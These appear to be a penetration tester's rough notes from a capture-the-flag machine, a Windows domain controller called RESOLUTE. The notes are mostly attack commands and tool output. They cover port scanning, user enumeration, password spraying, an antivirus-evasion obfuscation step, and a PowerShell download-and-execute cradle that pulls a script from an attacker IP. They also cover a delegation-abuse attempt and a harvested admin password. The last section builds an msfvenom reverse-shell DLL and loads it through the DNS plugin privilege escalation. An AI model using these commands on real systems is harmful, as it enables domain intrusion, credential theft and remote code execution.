

```
PORT      STATE SERVICE      VERSION
53/tcp    open  domain       Simple DNS Plus
88/tcp    open  kerberos-sec Microsoft Windows Kerberos (server time: 2021-12-04 03:46:50Z)
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
389/tcp   open  ldap         Microsoft Windows Active Directory LDAP (Domain: megabank.local, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds (workgroup: MEGABANK)
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap         Microsoft Windows Active Directory LDAP (Domain: megabank.local, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf       .NET Message Framing
47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Service Info: Host: RESOLUTE; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required
|_clock-skew: mean: 2h47m12s, deviation: 4h37m09s, median: 7m11s
| smb2-time: 
|   date: 2021-12-04T03:46:59
|_  start_date: 2021-12-04T02:39:13
| smb-os-discovery: 
|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
|   Computer name: Resolute
|   NetBIOS computer name: RESOLUTE\x00
|   Domain name: megabank.local
|   Forest name: megabank.local
|   FQDN: Resolute.megabank.local
|_  System time: 2021-12-03T19:46:58-08:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: required
```

enum4linux: `ndex: 0x10a9 RID: 0x457 acb: 0x00000210 Account: marko Name: Marko Novak       Desc: Account created. Password set to Welcome123!`

```
enum4linux
userlist ------------------------
Administrator
Guest
krbtgt
DefaultAccount
ryan
marko
sunita
abigail
marcus
sally
fred
angela
felicia
gustavo
ulf
stevie
claire
paulo
steve
annette
annika
per
claude
melanie
zach
simon
naoki
passlist ---------------------------
Welcome123!
```

brutespray with this shows that its not marko, but melanie that actually has the weak password



```
#NOTE THESE DONT WORK, BUT AN INTERSTING PRIVESC FROM FALSE BLOODHOUND READING. IF WE HAVE WRITE PRIVILEGES ON SOME COMPUTER, WE CAN WRITE msDS-AllowedToActOnBehalfOfOtherIdentity TO IMPERSONATE OTHER USERS ON THAT COMPUTER. IF THE COMPUTER IS DC / HAS UNCONSTRAINED DELEGATION, EVEN BETTER

theres an AV: bypass with  this repo `https://github.com/CBHue/PyFuscation`

`python3 PyFuscation/PyFuscation.py -f --ps PowerViewObfuscate.ps1`

`IEX(New-Object Net.WebClient).downloadString('http://10.10.16.9:8000/12042021_08_41_10.ps1')`
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;S-1-5-21-1392959593-3013219662-3596683436-10101)"
$SDBytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDBytes, 0)
Get-DomainComputer RESOLUTE | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes} -Verbose
(New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList $RawBytes, 0).DiscretionaryAcl



$target = 'megabank.local'
$targetComputer = Get-ADComputer -Filter 'dnshostname -eq $target'
$myaccount = Get-ADuser melanie -Properties sid | select -ExpandProperty sid
$schemaIDGUID = @{} 
Get-ADObject -SearchBase (Get-ADRootDSE).schemaNamingContext -LDAPFilter '(name=ms-DS-Allowed-To-Act-On-Behalf-Of-Other-Identity)' -Properties name, schemaIDGUID | ForEach-Object {$schemaIDGUID.add([System.GUID]$_.schemaIDGUID,$_.name)}
$permissions = Get-ObjectAcl $target | ?{$_.SecurityIdentifier -match $myaccount -and (($_.ObjectAceType -match $schemaIDGUID.Keys -and $_.ActiveDirectoryRights -like '*WriteProperty*') -or ($_.ActiveDirectoryRights -like '*GenericAll*' -or $_.ActiveDirectoryRights -like '*GenericWrite*' -or $_.ActiveDirectoryRights -like '*WriteDACL*')) }
```

```
hidden powershell transcript log in C:\
cmd /c "dir /adh /s"
type C:\PSTranscripts\20191203\PowerShell_transcript.RESOLUTE.OJuoBGhU.20191203063201.txt
ryan:Serv3r4Admin4cc123!

from bloodhound ryan is dns admin and theres some dll hijacking bs with that. lets do it.

msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.16.6 LPORT=4444 -f dll > bruh.dll
cmd /c "copy \\10.10.16.6\\share\bruh.dll C:\Users\ryan\Documents\bruh2.dll && dnscmd RESOLUTE.MEGABANK.LOCAL /config /serverlevelplugindll  C:\Users\ryan\Documents\bruh2.dll && sc \\RESOLUTE stop dns && sc \\RESOLUTE start dns"

cmd /c "dnscmd RESOLUTE.MEGABANK.LOCAL /config /serverlevelplugindll \\10.10.16.6\\share\bruh.dll && dnscmd RESOLUTE.MEGABANK.LOCAL /R"

for some fucking reason our shit thanosses in 2 seconds so we gotta chain it all together real quick
```

